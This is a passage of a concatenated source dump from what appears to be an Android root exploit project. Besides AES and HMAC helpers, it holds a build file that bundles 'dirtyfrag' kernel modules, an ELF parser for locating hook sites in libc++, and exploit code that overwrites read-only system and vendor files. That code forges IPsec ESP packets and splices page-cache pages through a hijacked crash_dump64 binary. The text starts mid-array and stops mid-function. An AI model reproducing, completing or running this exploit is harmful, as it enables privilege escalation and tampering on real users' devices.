+    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
+    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
+    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
+    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
+    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
+    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
+    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
+    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
+};
+
+static const uint8_t _isbox[256] = {
+    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
+    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
+    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
+    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
+    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
+    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
+    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
+    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
+    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
+    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
+    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
+    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
+    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
+    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
+    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
+    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d
+};
+
+static const uint8_t _rcon[11] = {0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36};
+
+static inline uint8_t _xtime(uint8_t a) {
+    return (uint8_t)((a << 1) ^ (a >> 7 ? 0x1b : 0));
+}
+static inline uint8_t _gmul(uint8_t a, uint8_t b) {
+    uint8_t r = 0;
+    for (int i = 0; i < 8; i++) {
+        if (b & 1) r ^= a;
+        a = _xtime(a); b >>= 1;
+    }
+    return r;
+}
+
+static void _aes256_expand(const uint8_t k[32], uint32_t rk[60]) {
+    for (int i = 0; i < 8; i++)
+        rk[i] = ((uint32_t)k[4*i]<<24)|((uint32_t)k[4*i+1]<<16)|((uint32_t)k[4*i+2]<<8)|k[4*i+3];
+    for (int i = 8; i < 60; i++) {
+        uint32_t t = rk[i-1];
+        if (i % 8 == 0) {
+            /* RotWord then SubWord then Rcon */
+            t = ((uint32_t)_sbox[(t>>16)&0xff]<<24)|((uint32_t)_sbox[(t>>8)&0xff]<<16)|
+                ((uint32_t)_sbox[t&0xff]<<8)|(uint32_t)_sbox[(t>>24)&0xff];
+            t ^= (uint32_t)_rcon[i/8] << 24;
+        } else if (i % 8 == 4) {
+            t = ((uint32_t)_sbox[(t>>24)&0xff]<<24)|((uint32_t)_sbox[(t>>16)&0xff]<<16)|
+                ((uint32_t)_sbox[(t>>8)&0xff]<<8)|(uint32_t)_sbox[t&0xff];
+        }
+        rk[i] = rk[i-8] ^ t;
+    }
+}
+
+static inline void _add_rk(uint8_t s[16], const uint32_t *rk) {
+    for (int c = 0; c < 4; c++) {
+        s[4*c+0] ^= (rk[c]>>24)&0xff;
+        s[4*c+1] ^= (rk[c]>>16)&0xff;
+        s[4*c+2] ^= (rk[c]>>8)&0xff;
+        s[4*c+3] ^=  rk[c]&0xff;
+    }
+}
+
+static inline void _inv_shift_rows(uint8_t s[16]) {
+    uint8_t t;
+    /* Row 1: right-shift by 1 */
+    t = s[13]; s[13]=s[9]; s[9]=s[5]; s[5]=s[1]; s[1]=t;
+    /* Row 2: right-shift by 2 (swap pairs) */
+    t = s[2]; s[2]=s[10]; s[10]=t;
+    t = s[6]; s[6]=s[14]; s[14]=t;
+    /* Row 3: right-shift by 3 */
+    t = s[3]; s[3]=s[7]; s[7]=s[11]; s[11]=s[15]; s[15]=t;
+}
+
+static inline void _inv_sub_bytes(uint8_t s[16]) {
+    for (int i = 0; i < 16; i++) s[i] = _isbox[s[i]];
+}
+
+static inline void _inv_mix_cols(uint8_t s[16]) {
+    for (int c = 0; c < 4; c++) {
+        uint8_t s0=s[4*c], s1=s[4*c+1], s2=s[4*c+2], s3=s[4*c+3];
+        s[4*c+0] = _gmul(0x0e,s0)^_gmul(0x0b,s1)^_gmul(0x0d,s2)^_gmul(0x09,s3);
+        s[4*c+1] = _gmul(0x09,s0)^_gmul(0x0e,s1)^_gmul(0x0b,s2)^_gmul(0x0d,s3);
+        s[4*c+2] = _gmul(0x0d,s0)^_gmul(0x09,s1)^_gmul(0x0e,s2)^_gmul(0x0b,s3);
+        s[4*c+3] = _gmul(0x0b,s0)^_gmul(0x0d,s1)^_gmul(0x09,s2)^_gmul(0x0e,s3);
+    }
+}
+
+/* AES-256 ECB single-block decrypt: ct[16] â†’ pt[16] */
+static void aes256_ecb_decrypt(const uint8_t key[32], const uint8_t ct[16], uint8_t pt[16]) {
+    uint32_t rk[60];
+    _aes256_expand(key, rk);
+    uint8_t s[16];
+    for (int i = 0; i < 16; i++) s[i] = ct[i];
+
+    _add_rk(s, &rk[56]);   /* AddRoundKey round 14 */
+
+    for (int r = 13; r >= 1; r--) {
+        _inv_shift_rows(s);
+        _inv_sub_bytes(s);
+        _add_rk(s, &rk[4*r]);
+        _inv_mix_cols(s);
+    }
+
+    _inv_shift_rows(s);
+    _inv_sub_bytes(s);
+    _add_rk(s, &rk[0]);    /* AddRoundKey round 0 */
+
+    for (int i = 0; i < 16; i++) pt[i] = s[i];
+}
+
+============================================================
+
+FILE: ./app/src/main/jni/hmac_sha256.h
+============================================================
+#pragma once
+#include <stdint.h>
+#include <string.h>
+
+typedef struct {
+    uint32_t state[8];
+    uint64_t count;
+    uint8_t  buf[64];
+} sha256_ctx;
+
+static const uint32_t _sha256_k[64] = {
+    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
+};
+static inline uint32_t _rotr32(uint32_t x, int n) { return (x >> n) | (x << (32 - n)); }
+static inline void sha256_transform(sha256_ctx *ctx, const uint8_t data[64]) {
+    uint32_t w[64];
+    for (int i = 0; i < 16; i++)
+        w[i] = ((uint32_t)data[i*4]<<24)|((uint32_t)data[i*4+1]<<16)|((uint32_t)data[i*4+2]<<8)|(uint32_t)data[i*4+3];
+    for (int i = 16; i < 64; i++) {
+        uint32_t s0 = _rotr32(w[i-15],7)^_rotr32(w[i-15],18)^(w[i-15]>>3);
+        uint32_t s1 = _rotr32(w[i-2],17)^_rotr32(w[i-2],19)^(w[i-2]>>10);
+        w[i] = w[i-16]+s0+w[i-7]+s1;
+    }
+    uint32_t a=ctx->state[0],b=ctx->state[1],c=ctx->state[2],d=ctx->state[3];
+    uint32_t e=ctx->state[4],f=ctx->state[5],g=ctx->state[6],h=ctx->state[7];
+    for (int i = 0; i < 64; i++) {
+        uint32_t S1=_rotr32(e,6)^_rotr32(e,11)^_rotr32(e,25);
+        uint32_t ch=(e&f)^(~e&g);
+        uint32_t t1=h+S1+ch+_sha256_k[i]+w[i];
+        uint32_t S0=_rotr32(a,2)^_rotr32(a,13)^_rotr32(a,22);
+        uint32_t maj=(a&b)^(a&c)^(b&c);
+        uint32_t t2=S0+maj;
+        h=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
+    }
+    ctx->state[0]+=a;ctx->state[1]+=b;ctx->state[2]+=c;ctx->state[3]+=d;
+    ctx->state[4]+=e;ctx->state[5]+=f;ctx->state[6]+=g;ctx->state[7]+=h;
+}
+static inline void sha256_init(sha256_ctx *ctx) {
+    ctx->state[0]=0x6a09e667;ctx->state[1]=0xbb67ae85;ctx->state[2]=0x3c6ef372;ctx->state[3]=0xa54ff53a;
+    ctx->state[4]=0x510e527f;ctx->state[5]=0x9b05688c;ctx->state[6]=0x1f83d9ab;ctx->state[7]=0x5be0cd19;
+    ctx->count=0; memset(ctx->buf,0,64);
+}
+static inline void sha256_update(sha256_ctx *ctx, const uint8_t *data, size_t len) {
+    size_t idx=(size_t)(ctx->count&63); ctx->count+=len;
+    for (size_t i=0;i<len;i++) {
+        ctx->buf[idx++]=data[i];
+        if (idx==64) { sha256_transform(ctx,ctx->buf); idx=0; }
+    }
+}
+static inline void sha256_final(sha256_ctx *ctx, uint8_t out[32]) {
+    uint64_t bits=ctx->count*8; size_t idx=(size_t)(ctx->count&63);
+    ctx->buf[idx++]=0x80;
+    if (idx>56) { memset(ctx->buf+idx,0,64-idx); sha256_transform(ctx,ctx->buf); idx=0; }
+    memset(ctx->buf+idx,0,56-idx);
+    for (int i=0;i<8;i++) ctx->buf[56+i]=(uint8_t)(bits>>(56-8*i));
+    sha256_transform(ctx,ctx->buf);
+    for (int i=0;i<8;i++) { out[i*4]=(uint8_t)(ctx->state[i]>>24); out[i*4+1]=(uint8_t)(ctx->state[i]>>16); out[i*4+2]=(uint8_t)(ctx->state[i]>>8); out[i*4+3]=(uint8_t)(ctx->state[i]); }
+}
+static inline void hmac_sha256(const uint8_t *key, int key_len,
+                                const uint8_t *msg, int msg_len,
+                                uint8_t out[32]) {
+    uint8_t k_ipad[64],k_opad[64],tk[32];
+    if (key_len>64) {
+        sha256_ctx hctx; sha256_init(&hctx); sha256_update(&hctx,key,(size_t)key_len); sha256_final(&hctx,tk);
+        key=tk; key_len=32;
+    }
+    memset(k_ipad,0x36,64); memset(k_opad,0x5c,64);
+    for (int i=0;i<key_len;i++) { k_ipad[i]^=key[i]; k_opad[i]^=key[i]; }
+    sha256_ctx ctx; uint8_t inner[32];
+    sha256_init(&ctx); sha256_update(&ctx,k_ipad,64); sha256_update(&ctx,msg,(size_t)msg_len); sha256_final(&ctx,inner);
+    sha256_init(&ctx); sha256_update(&ctx,k_opad,64); sha256_update(&ctx,inner,32); sha256_final(&ctx,out);
+}
+
+============================================================
+
+FILE: ./app/src/main/jni/reporter.h
+============================================================
+#pragma once
+#include <jni.h>
+
+struct Reporter { JNIEnv *env; jobject obj; };
+
+void reportfmt(struct Reporter *r, const char *fmt, ...) __attribute__((__format__(printf, 2, 3)));
+#define REPORTLN(fmt, ...) reportfmt(reporter, fmt "\n" __VA_OPT__(,) __VA_ARGS__)
+
+============================================================
+
+FILE: ./app/src/main/jni/CMakeLists.txt
+============================================================
+cmake_minimum_required(VERSION 3.22)
+project(exp)
+enable_language(ASM)
+
+set(CMAKE_ASM_FLAGS "${CMAKE_ASM_FLAGS} -I${CMAKE_SOURCE_DIR}")
+set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} ${C_FLAGS} -I${CMAKE_SOURCE_DIR} -Wall -Wextra -fno-stack-protector -fomit-frame-pointer")
+
+set(SPLICEHELPER "${CMAKE_CURRENT_SOURCE_DIR}/splicehelper")
+add_custom_command(
+    OUTPUT "${SPLICEHELPER}"
+    COMMAND "${CMAKE_C_COMPILER}"
+            --target=${CMAKE_C_COMPILER_TARGET}
+            --sysroot=${CMAKE_SYSROOT}
+            "${CMAKE_CURRENT_SOURCE_DIR}/splicehelper.c"
+            -o "${SPLICEHELPER}"
+            -nodefaultlibs -nostartfiles -ffreestanding -static
+    COMMAND "${CMAKE_STRIP}" "${SPLICEHELPER}"
+    DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/splicehelper.c"
+    COMMENT "Building splicehelper"
+)
+add_custom_target(splicehelper_bin DEPENDS "${SPLICEHELPER}")
+
+add_library(exp SHARED exp.c libcxx.S elf_parser.c)
+add_dependencies(exp splicehelper_bin)
+
+set_source_files_properties(exp.c PROPERTIES OBJECT_DEPENDS
+    "${CMAKE_SOURCE_DIR}/ko/dirtyfrag-android12-5.10.ko;\
+${CMAKE_SOURCE_DIR}/ko/dirtyfrag-android13-5.10.ko;\
+${CMAKE_SOURCE_DIR}/ko/dirtyfrag-android13-5.15.ko;\
+${CMAKE_SOURCE_DIR}/ko/dirtyfrag-android14-5.15.ko;\
+${CMAKE_SOURCE_DIR}/ko/dirtyfrag-android15-6.6.ko;\
+${CMAKE_SOURCE_DIR}/ko/dirtyfrag-android16-6.12.ko;\
+${CMAKE_SOURCE_DIR}/ko/dirtyfrag-android17-6.18.ko;\
+${CMAKE_SOURCE_DIR}/splicehelper")
+
+target_link_libraries(exp log)
+target_link_options(exp PRIVATE -Wl,-z,max-page-size=16384)
+
+============================================================
+
+FILE: ./source_code.txt
+============================================================
+
+============================================================
+
+FILE: ./app/src/main/jni/elf_parser.c
+============================================================
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <linux/elf.h>
+#include "reporter.h"
+
+int find_hook_target(const char *libcxx, const char *symname,
+                     uint64_t *hook_target, uint64_t *payload_target,
+                     uint32_t *first_instruction, struct Reporter *reporter) {
+    *hook_target = 0;
+    *payload_target = 0;
+
+    int fd = open(libcxx, O_RDONLY);
+    if (fd < 0) {
+        REPORTLN("open %s failed: %s", libcxx, strerror(errno));
+        return 1;
+    }
+
+    Elf64_Ehdr hdr;
+    if (read(fd, (char *)&hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)) {
+        REPORTLN("read ELF header from %s failed: %s", libcxx, strerror(errno));
+        close(fd); return 1;
+    }
+    if (strncmp((char *)hdr.e_ident, "\x7f""ELF", 4) != 0) {
+        REPORTLN("invalid ELF: %s", libcxx);
+        close(fd); return 1;
+    }
+    if (lseek64(fd, hdr.e_phoff, SEEK_SET) < 0) {
+        REPORTLN("lseek64 e_phoff failed: %s", strerror(errno));
+        close(fd); return 1;
+    }
+    if (hdr.e_phentsize != sizeof(Elf64_Phdr)) {
+        REPORTLN("invalid phentsize: %d", hdr.e_phentsize);
+        close(fd); return 1;
+    }
+
+    uint64_t executable_off = 0;
+    uint64_t executable_vaddr = 0;
+    for (int i = 0; i < hdr.e_phnum; i++) {
+        Elf64_Phdr phdr;
+        if (read(fd, (char *)&phdr, sizeof(phdr)) < 0) {
+            REPORTLN("read phdr[%d] failed: %s", i, strerror(errno));
+            close(fd); return 1;
+        }
+        if (phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X)) {
+            *payload_target = phdr.p_offset + phdr.p_filesz;
+            executable_off   = phdr.p_offset;
+            executable_vaddr = phdr.p_vaddr;
+            break;
+        }
+    }
+
+    if (lseek64(fd, hdr.e_shoff + hdr.e_shstrndx * sizeof(Elf64_Shdr), SEEK_SET) < 0) {
+        REPORTLN("lseek64 shstrndx failed: %s", strerror(errno));
+        close(fd); return 1;
+    }
+    Elf64_Shdr str_shdr;
+    if (read(fd, (char *)&str_shdr, sizeof(str_shdr)) < 0) {
+        REPORTLN("read shstrndx failed: %s", strerror(errno));
+        close(fd); return 1;
+    }
+
+    uint64_t dynstr = 0, dynsym_offset = 0, dynsym_size = 0;
+    for (int i = 0; i < hdr.e_shnum; i++) {
+        Elf64_Shdr shdr;
+        if (lseek64(fd, hdr.e_shoff + i * sizeof(Elf64_Shdr), SEEK_SET) < 0) {
+            REPORTLN("lseek64 shdr[%d] failed: %s", i, strerror(errno));
+            close(fd); return 1;
+        }
+        if (read(fd, (char *)&shdr, sizeof(shdr)) < 0) {
+            REPORTLN("read shdr[%d] failed: %s", i, strerror(errno));
+            close(fd); return 1;
+        }
+        if (lseek64(fd, shdr.sh_name + str_shdr.sh_offset, SEEK_SET) < 0) {
+            REPORTLN("lseek64 sh_name[%d] failed: %s", i, strerror(errno));
+            close(fd); return 1;
+        }
+        char name[100];
+        if (read(fd, name, sizeof(name) - 1) < 0) {
+            REPORTLN("read sh_name[%d] failed: %s", i, strerror(errno));
+            close(fd); return 1;
+        }
+        name[sizeof(name) - 1] = 0;
+        if (strcmp(name, ".dynstr") == 0) dynstr = shdr.sh_offset;
+        if (strcmp(name, ".dynsym") == 0) { dynsym_offset = shdr.sh_offset; dynsym_size = shdr.sh_size; }
+    }
+
+    if (dynstr == 0 || dynsym_offset == 0) {
+        REPORTLN(".dynstr or .dynsym not found in %s", libcxx);
+        close(fd); return 1;
+    }
+
+    for (int i = 0; i < (int)(dynsym_size / sizeof(Elf64_Sym)); i++) {
+        Elf64_Sym sym;
+        if (lseek64(fd, dynsym_offset + i * sizeof(Elf64_Sym), SEEK_SET) < 0) {
+            REPORTLN("lseek64 dynsym[%d] failed: %s", i, strerror(errno));
+            close(fd); return 1;
+        }
+        if (read(fd, (char *)&sym, sizeof(sym)) < 0) {
+            REPORTLN("read dynsym[%d] failed: %s", i, strerror(errno));
+            close(fd); return 1;
+        }
+        if (lseek64(fd, dynstr + sym.st_name, SEEK_SET) < 0) {
+            REPORTLN("lseek64 st_name[%d] failed: %s", i, strerror(errno));
+            close(fd); return 1;
+        }
+        char name[200];
+        if (read(fd, name, sizeof(name) - 1) < 0) {
+            REPORTLN("read st_name[%d] failed: %s", i, strerror(errno));
+            close(fd); return 1;
+        }
+        name[sizeof(name) - 1] = 0;
+        if (strcmp(name, symname) == 0)
+            *hook_target = sym.st_value - executable_vaddr + executable_off;
+    }
+
+    if (*hook_target == 0) {
+        REPORTLN("symbol %s not found in %s", symname, libcxx);
+        close(fd); return 1;
+    }
+
+    if (lseek64(fd, *hook_target, SEEK_SET) < 0) {
+        REPORTLN("lseek64 hook_target failed: %s", strerror(errno));
+        close(fd); return 1;
+    }
+    if (read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
+        REPORTLN("read first instruction failed: %s", strerror(errno));
+        close(fd); return 1;
+    }
+
+    if (*first_instruction == 0xd503233fU || *first_instruction == 0xd503245f) {
+        REPORTLN("PACIASP/BTI at hook site, advancing +4");
+        *hook_target += 4UL;
+        if (read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
+            REPORTLN("read first instruction +4 failed: %s", strerror(errno));
+            close(fd); return 1;
+        }
+    }
+
+    close(fd);
+    return 0;
+}
+
+============================================================
+
+FILE: ./app/src/main/jni/exp.c
+============================================================
+#include <stdio.h>
+#include <stdarg.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sched.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/uio.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/utsname.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <jni.h>
+#include "reporter.h"
+#include "aes256.h"
+#include "hmac_sha256.h"
+
+static jmethodID report_mid;
+
+JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved __attribute__((unused))) {
+    JNIEnv *env;
+    (*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4);
+    jclass clz = (*env)->FindClass(env, "df/root/IReporter");
+    report_mid = (*env)->GetMethodID(env, clz, "report", "(Ljava/lang/String;)V");
+    return JNI_VERSION_1_4;
+}
+
+
+struct PatchRestore {
+    const char *lib;
+    uint64_t shell_off;
+    size_t   shell_padded;
+    char    *shell_orig;   /* heap-allocated original shellcode bytes */
+    uint64_t tramp_aligned;
+    uint8_t  tramp_orig[16];
+    int      valid;
+};
+
+void reportfmt(struct Reporter *r, const char *fmt, ...) {
+    if (!r) return;
+    va_list va; va_start(va, fmt);
+    char buf[1024]; vsnprintf(buf, sizeof(buf), fmt, va);
+    jstring s = (*r->env)->NewStringUTF(r->env, buf);
+    (*r->env)->CallVoidMethod(r->env, r->obj, report_mid, s);
+    (*r->env)->ExceptionClear(r->env);
+    (*r->env)->DeleteLocalRef(r->env, s);
+}
+
+static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
+static char    *libcxx_ko_target;
+static uint8_t *libcxx_soft_reboot;
+
+/* SA parameters set by Java via nativeRunAll() before any patching. */
+static int      g_encap_port;
+static int      g_sender_port;
+static uint32_t g_spi;
+static uint8_t  g_aes_key[32];
+static uint8_t  g_hmac_key[32];
+static int      g_icv_len;    /* auth truncation in bytes (128-bit â†’ 16) */
+static uint32_t g_seq = 1;   /* monotonically increasing per-write */
+
+/* IV = AES256_ECB_DEC(key, old_content) XOR desired
+ * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
+ *   = AES_DEC(key, old_content) XOR IV
+ *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
+ *   = desired
+ */
+static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
+    uint8_t dec[16];
+    aes256_ecb_decrypt(g_aes_key, old_content, dec);
+    for (int i = 0; i < 16; i++)
+        iv[i] = dec[i] ^ desired[i];
+}
+
+/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
+ * crash_dump64 has been overwritten with splicehelper which supports argv[3]="r".
+ */
+static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *reporter) {
+    int rdpipe[2];
+    if (pipe(rdpipe) < 0) { REPORTLN("pipe failed: %s", strerror(errno)); return -1; }
+
+    char offstr[24];
+    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
+
+    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
+    if (pid < 0) {
+        REPORTLN("vfork failed: %s", strerror(errno));
+        close(rdpipe[0]); close(rdpipe[1]);
+        return -1;
+    }
+    if (pid == 0) {
+        close(rdpipe[0]);
+        if (rdpipe[1] != 0) {
+            if (dup2(rdpipe[1], 0) < 0) _exit(1);
+            close(rdpipe[1]);
+        }
+        execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, "r", NULL);
+        _exit(1);
+    }
+    close(rdpipe[1]);
+    int status;
+    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
+    int n = 0;
+    if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
+        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
+    close(rdpipe[0]);
+    if (n != 16) {
+        if (WIFEXITED(status)) {
+            static const char *const exit_meanings[] = {
+                [0] = "success",
+                [1] = "open vendor file failed or read returned < 16 bytes",
+                [2] = "write to pipe returned < 16 bytes",
+                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
+            };
+            int ec = WEXITSTATUS(status);
+            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
+            REPORTLN("read_vendor at 0x%lx got %d bytes: %s",
+                     (long)offset, n, meaning);
+        } else if (WIFSIGNALED(status))
+            REPORTLN("read_vendor at 0x%lx got %d bytes: signal %d",
+                     (long)offset, n, WTERMSIG(status));
+        else
+            REPORTLN("read_vendor at 0x%lx got %d bytes: status 0x%x",
+                     (long)offset, n, status);
+        return -1;
+    }
+    return 0;
+}
+
+/* Send one CBC write.
+ * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
+ * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
+ * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
+ * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
+ */
+static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
+                            const uint8_t iv[16], const uint8_t old_content[16],
+                            int use_helper, struct Reporter *reporter) {
+    int ret = -1;
+
+    int pfd[2];
+    if (pipe(pfd) < 0) { REPORTLN("pipe failed: %s", strerror(errno)); return -1; }
+    fcntl(pfd[1], F_SETPIPE_SZ, 65536);
+
+    /* ESP header: SPI(4) + seq(4) + IV(16) = 24 bytes */
+    uint32_t seq = g_seq++;
+    uint8_t hdr[24];
+    *(uint32_t *)(hdr + 0) = htonl(g_spi);
+    *(uint32_t *)(hdr + 4) = htonl(seq);
+    memcpy(hdr + 8, iv, 16);
+
+    /* HMAC-SHA256 over ESP_hdr(8) || IV(16) || ciphertext(16) = 40 bytes */
+    uint8_t hmac_msg[40];
+    memcpy(hmac_msg,      hdr,         8);   /* SPI + seq */
+    memcpy(hmac_msg + 8,  iv,          16);  /* IV */
+    memcpy(hmac_msg + 24, old_content, 16);  /* ciphertext = file page */
+    uint8_t hmac_full[32];
+    hmac_sha256(g_hmac_key, 32, hmac_msg, 40, hmac_full);
+
+    /* vmsplice header + IV (24 bytes) */
+    struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
+    if (vmsplice(pfd[1], &iov1, 1, SPLICE_F_GIFT) != 24) {
+        REPORTLN("vmsplice hdr failed: %s", strerror(errno)); goto out_pipe;
+    }
+
+    /* splice ciphertext from file (16 bytes, page-cache reference) */
+    if (use_helper) {
+        char offstr[24];
+        snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
+        int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
+        if (pid < 0) { REPORTLN("vfork failed: %s", strerror(errno)); goto out_pipe; }
+        if (pid == 0) {
+            if (pfd[1] != 1 && dup2(pfd[1], 1) < 0) _exit(1);
+            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
+            _exit(1);
+        }
+        int st;
+        TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
+            REPORTLN("splice helper failed status=0x%x", st);
+            goto out_pipe;
+        }
+    } else {
+        off_t off = offset;
+        if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
+            REPORTLN("splice file failed: %s", strerror(errno)); goto out_pipe;
+        }
+    }
+
+    /* vmsplice ICV (truncated HMAC) */
+    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
+    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
+        REPORTLN("vmsplice ICV failed: %s", strerror(errno)); goto out_pipe;
+    }
+
+    /* splice pipe â†’ UDP: 24 + 16 + icv_len bytes */
+    {
+        int total = 24 + 16 + g_icv_len;
+        ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
+        ret = (s == total) ? 0 : -1;
+        if (ret) REPORTLN("splice pipe->udp: %zd expected %d", s, total);
+    }
+
+out_pipe:
+    close(pfd[0]); close(pfd[1]);
+    return ret;
+}
+
+/* Patch len bytes of payload into file starting at file offset foff.
+ * Writes in 16-byte CBC blocks.
+ * For system files (use_helper=0): reads old_content with pread().
+ * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
+ * len must be a multiple of 16.
+ */
+static int patch_file_cbc(const char *path, const char *payload, size_t len,
+                           size_t foff, int use_helper, struct Reporter *reporter) {
+    if (len % 16 != 0) {
+        REPORTLN("patch_file_cbc: len=%zu not multiple of 16", len);
+        return -1;
+    }
+
+    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sk_send < 0) { REPORTLN("socket failed: %s", strerror(errno)); return -1; }
+    {
+        int opt = 1;
